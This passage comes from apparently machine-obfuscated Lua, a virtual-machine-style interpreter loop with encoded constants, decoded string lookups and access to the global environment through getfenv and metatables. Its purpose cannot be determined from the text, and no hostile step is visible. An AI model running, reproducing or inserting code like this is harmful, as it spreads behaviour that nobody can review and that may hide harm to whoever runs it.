v=b()Q[i]=I N=o[f]u,f=I,t(561649+-567103)r=N[f]N=b()T=t(695050-700854)f=b()Q[N]=r r=P(2483588158%22039713,{})Q[f]=r r=3166164630%16758785<2698094638%12529023 Y=h(5462758890%27233600,{v})Q[v]=r C=o[T]T=C(Y)I,r=T and-590386+13294006 or-968318+12760550,T else i,C=t(873083+-878770),2405254606289-(-482031)r=o[i]u=t(1034508-1040256)N=Q[j[1108473582%5570219]]f=Q[j[-235815+235817]]v=f(u,C)i=N[v]I=r[i]r={I(O)}r,I={W(r)},o[t(-63714+58187)]end else if I<1467152099%10814026 then I=665397+15237297 elseif 896124+6419555>I then O,N=U[538609+-538608],t(-168869+163470)i=o[N]I,r=i and 1223119907%11540833 or-105635+8475554,i else r=Q[i]T=t(399276+-404678)I=r~=T I=I and 5632571437%25433353 or 394476+660276 end end end end else if I<2686680563%11349338 then if-972798+8695785>I then if I>297577+7330431 then if I<6768941-(-923581)then O,I=nil,4242269308%20841597 Q[j[46305+-46300]]=r elseif I<7166586-(-545905)then I,r=o[t(-744894-(-739511))],{}else T,C=-625651+7705407105019,t(-1029056+1023469)f=Q[j[1046146-1046144]]v=Q[j[626844694%2477647]]u=v(C,T)r=f[u]I=i[r]r={I}I=o[t(221991+-227448)]end else if I<7973139-526128 then i=Q[j[-791353+791355]]N=489776-489775 O=i*N i=-825658+22804825631791 r=O+i O=-724598+35184372813430 I=r%O Q[j[-854906+854908]]=I I=411565+4568811 elseif I<7881488-387884 then i,C,u=t(747220-752759),1420604463968-677429,t(-348203+342491)r=o[i]N=Q[j[-475694-(-475695)]]f=Q[j[856946818%4100224]]v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(-899516+893775)],{W(r)}elseif 8024981-483503>I then O=t(733068-738871)I=o[O]N=76732799%536593 i=Q[j[331954-331946]]O=I(i,N)I=-737335+2248805 else I=4585069-631796>=1343625-361067 I=I and-834042+16103372 or 2699993520%12884873 end end else if I>-23457+7947667 then if 1793394378%8421377>I then i,C,u=t(257384+-262908),27817205102753-496495,t(128393-134116)r=o[i]N=Q[j[-402475-(-402476)]]f=Q[j[783482-783480]]v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(597043+-602515)],{W(r)}elseif 1628778021%20777082>I then X=Q[j[119588+-119587]]F,B=-1021440+2949659828411,t(499336-504880)s=Q[j[536307-536305]]y=s(B,F)l=X[y]w=i[l]Y=#w w,I=1638141861%10302779,447150+14512923 T=Y>w u=T else y,l=not s,X+l Y=l<=w Y=y and Y y=l>=w y=s and y Y=y or Y y=13288822-(-103459)I=Y and y Y=5103035-199974 I=I or Y end else if 50466+7709899>I then r,w=t(-306704-(-301097)),29394579747799-264424 I=o[r]u=Q[j[2250534371%9576742]]C=Q[j[550065+-550063]]Y=t(-696569-(-690997))T=C(Y,w)v=u[T]f=i[v]r=I(f)f=r I=f and-347947+16135437 or 160869+8938161 elseif I<8075799-253992 then I,N,i=4032083234%23242438,nil,nil else I=9043380-226983 end end end else if I<890413618%12969868 then if 542897+7808589>I then if-996991+9280891>I then C,N=not u,N+v i=N<=f i=C and i C=N>=f C=u and C i=C or i C=5204747065%28996470 I=i and C i=3339333-(-17953)I=I or i elseif I<8967153-653556 then r=Q[j[2245477656%12615043]]i=Q[j[2804552061%12140918]]v=t(337258+-343014)N=Q[j[-982590+982594]]u=25556909833968-745975 f=N(v,u)O=i[f]I=r[O]i,O=804083764%6138044,I r=#O I=r==i I=I and 2157026-324522 or 741003328%4558987 else I=Q[j[594610+-594606]]r=I()I=5678797-(-198118)end else if-871547+9258362>I then I=r and 6665120921%26179871 or 772982-(-992447)elseif 8966450-533809>I then m=b()c,a=t(583357-588978),680501+-680246 Q[m]=B S,J=t(180168-185894),4186368000%16745472 p=o[S]S=t(165669+-171247)r=p[S]L,S,H=-410860-(-410861),479023+-479022,-815225+815325 p=r(S,H)H=2201247468%9287964 S=b()Q[S]=p r=Q[C]n=853370+-853368 p=r(H,a)H=b()a=599074066%2786391 Q[H]=p r=Q[C]Z=Q[S]p=r(a,Z)a=b()Q[a]=p p=Q[C]Z=p(L,n)n,p=t(257281-262824),-1014847+1014848 r=Z==p Z=t(-550001+544584)p=b()Q[p]=r x,r=-542817-(-552817),t(354347+-359771)V=o[c]E=Q[C]g={E(J,x)}c=V(W(g))r,V=y[r],t(616115+-621658)oR=c..V L=n..oR n=t(-201254+195450)r=r(y,Z,L)Z=b()oR=D(13669761-(-943165),{C;m;l,N,i;F;p,Z,S,a;H;Y})Q[Z]=r L=o[n]n={L(oR)}r={W(n)}L=r r=Q[p]I=r and 7384087745%29834639 or 3591886-537201 else I=r and 16441815-863227 or 320628294%13252501 end end else if 4523496892%21705367>I then if 2330383810%12093297>I then w=Q[j[29594707%348173]]r,y,C=t(-971198+965571),20888137876723-719094,u r,s=T[r],t(903698-909500)l=Q[j[613686-613683]]X=l(s,y)Y=w[X]r=r(T,Y)I=r and 316323263%11358555 or 2018249411%9103126 elseif I<7624840-(-987007)then i=t(-316714+311034)r=o[i]u=t(458990+-464565)N=Q[j[506097-506096]]f=Q[j[1515003632%7214303]]C=34659295684259-(-628595)v=f(u,C)i=N[v]I=r[i]r={I(O)}I,r=o[t(285391-291177)],{W(r)}else p,s=not m,s+F X=y>=s X=p and X p=s>=y p=m and p X=p or X p=11956493-584114 I=X and p X=882491+4599660 I=I or X end else if I<7825934-(-989951)then I=3784595-(-310506)elseif I<394668+8493923 then v,O,u=t(-514352+508738),t(-637620+631885),1004607+15136999432914 r=o[O]i=Q[j[37409+-37408]]N=Q[j[-739447+739449]]f=N(v,u)O=i[f]I=r[O]O=Q[j[-193254+193257]]r=I(O)I=r and 10204184-(-46881)or 7624392-(-86563)else I=r and 1213869677%7616744 or 1050730309%21755544 end end end end end end end end I=#A return W(r)end,-946493-(-946493),function(o)local t,I=890045-890044,o[3060666001%12752775]while I do O[I],t=O[I]-2256350801%11281754,t+2345366233%11221848 if O[I]==637623400%3911800 then O[I],Q[I]=nil,nil end I=o[t]end end,function(o,t)local W=N(t)local U=function(U,j,A,d,r)return I(o,{U;j;A,d;r},t,W)end return U end,{},function(o,t)local W=N(t)local U=function(U,j)return I(o,{U,j},t,W)end return U end,function(o,t)local W=N(t)local U=function(U,j,A,d,r,Q)return I(o,{U;j,A,d,r;Q},t,W)end return U end,{},function(o)for t=-452974+452975,#o,858747+-858746 do O[o[t]]=(1047745-1047744)+O[o[t]]end if U then local I=U(true)local W=A(I)W[t(-494757-(-489263))],W[t(34677-40417)],W[t(165285+-170760)]=o,f,function()return-891836+-36064 end return I else return j({},{[t(347391-353131)]=f;[t(-204710+199216)]=o,[t(1030365-1035840)]=function()return-956862+28962 end})end end,function(o,t)local W=N(t)local U=function(U,j,A,d)return I(o,{U,j,A,d},t,W)end return U end,function()i=(794425+-794424)+i O[i]=-209831+209832 return i end,function(o,t)local W=N(t)local U=function(U)return I(o,{U},t,W)end return U end,function(o,t)local W=N(t)local U=function()return I(o,{},t,W)end return U end return(v(86018108%11915115,{}))(W(r))end)(setmetatable,getmetatable,getfenv and getfenv()or _ENV,newproxy,select,unpack or table[t(-117742-(-112291))],{...})end)(...)
